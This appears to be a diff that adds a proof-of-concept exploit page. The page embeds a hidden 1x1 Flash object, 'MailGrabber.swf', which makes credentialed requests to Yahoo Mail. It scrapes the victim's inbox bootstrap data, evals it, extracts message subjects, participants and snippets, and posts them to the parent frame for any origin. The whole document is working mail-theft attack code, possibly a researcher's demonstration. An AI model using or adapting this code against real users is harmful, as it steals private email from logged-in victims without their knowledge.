@@ -1,0 +1,48 @@
+<script>
+var FETCH_MAIL_URL = "http" + "s://mg.mail.yahoo.com/neo/launch";
+var BOOTSTRAP_REGEX = /[\s\S]+<script>(\(function\(NC\)\{NC\.ulPadding=.*?)<\/script>[\s\S]+/m;
+
+var NeoConfig = {};
+
+function deflashify(flashed) {
+    return JSON.parse(decodeURIComponent(flashed));
+}
+
+function flashProxy(url, data, callback_name) {
+    document.getElementById('flasher').send(url, data, callback_name);
+}
+
+function onMailLeaked(status, data) {
+    // Pull the JS bootstrap data out of the mail listing
+    // and eval it... don't do this at home, kids.
+    var pageData = deflashify(data);
+    var prettyMsgs = "";
+    if (pageData) {
+        var jsData = pageData.replace(BOOTSTRAP_REGEX, '$1');
+        // This will shove a bunch of data into `NeoConfig`
+        try {
+            eval(jsData);
+        } catch(e) {}
+        
+        // pick out the attrs we want
+        var msgs = NeoConfig.msgListObj.map(function(val){
+            return {
+                "subject": val.subject,
+                "participantList": val.participantList,
+                "snippetStr": val.snippetStr,
+            };
+        });
+        prettyMsgs = JSON.stringify(msgs, null, 2);
+    } else {
+        prettyMsgs = "Couldn't fetch inbox. Are you logged in on YMail?";
+    }
+    window.parent.postMessage(prettyMsgs, "*");
+}
+
+// This will be called by `MailGrabber.swf`
+function flasherReady() {
+    flashProxy(FETCH_MAIL_URL, "", "onMailLeaked");
+}
+
+</script>
+<object id="flasher" width="1" height="1" data="//spoof.yahoo.com/MailGrabber.swf"><param name="AllowScriptAccess" value="always"></object>
